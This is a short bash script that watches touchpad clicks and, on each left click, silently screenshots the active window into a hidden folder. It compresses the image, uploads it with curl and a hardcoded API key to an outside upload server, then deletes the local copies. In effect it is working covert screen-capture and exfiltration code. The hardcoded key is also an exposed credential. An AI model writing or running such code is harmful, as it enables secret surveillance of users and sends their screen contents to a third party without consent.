#!/bin/bash
uploadserver=https://upload.nizu.io/
myuser=$(whoami)
user=1
key=zFaZdHVYiseUsRgmqnm9MerIPBC4T1Re
curlfile="files[]=@/home/$myuser/.screenshots-bg/"
mkdir -p ~/.screenshots-bg
MOUSE_ID=$(xinput --list | grep -i -m 1 'touchpad'  | grep -o 'id=[0-9]\+' | grep -o '[0-9]\+')
echo $MOUSE_ID
STATE1=$(xinput --query-state $MOUSE_ID | grep 'button\[' | sort)
while true; do
    sleep 0.1
    STATE2=$(xinput --query-state $MOUSE_ID | grep 'button\[' | sort)
    comm -13 <(echo "$STATE1") <(echo "$STATE2")
    STATE1=$STATE2
    if [[ "$STATE1" == *"button[1]=down"* ]]
    then 
    	pngfile=$(date +"%Y-%m-%d-%H-%M").png
		webfile=$(date +"%Y-%m-%d-%H-%M").webp
		curlf="curl -F '${curlfile}${webfile}' -F 'key=${key}' ${uploadserver}"
		scrot -z -u '%Y-%m-%d-%H-%M.png' -e 'mv $f ~/.screenshots-bg/'
		convert ~/.screenshots-bg/$pngfile -quality 30% ~/.screenshots-bg/$webfile
		rm ~/.screenshots-bg/$pngfile
		eval $curlf
		rm ~/.screenshots-bg/$webfile
    	sleep 3
    fi

done
